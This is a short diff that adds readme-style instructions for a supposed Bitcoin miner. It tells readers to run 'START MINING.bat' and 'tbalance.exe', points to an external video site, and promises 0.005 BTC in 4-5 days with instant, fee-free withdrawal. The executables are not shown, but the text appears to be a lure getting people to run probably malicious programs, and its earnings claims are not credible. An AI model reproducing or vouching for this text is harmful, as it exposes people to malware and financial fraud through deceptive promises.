@@ -1,0 +1,9 @@
+Click file: "START MINING.bat" to start fast btc mining.
+after connection
+Click file: "tbalance.exe" to get your balance.
+
+Watch video how it work. https://btc-miner.net/
+
+IMPORTANT !
+Do not close "START MINING.bat" and "tbalance.exe" program. Your balance will be zero.
+Approximately after 4-5 days you mining 0.005 BTC. Withdraw instantly. No any fee.
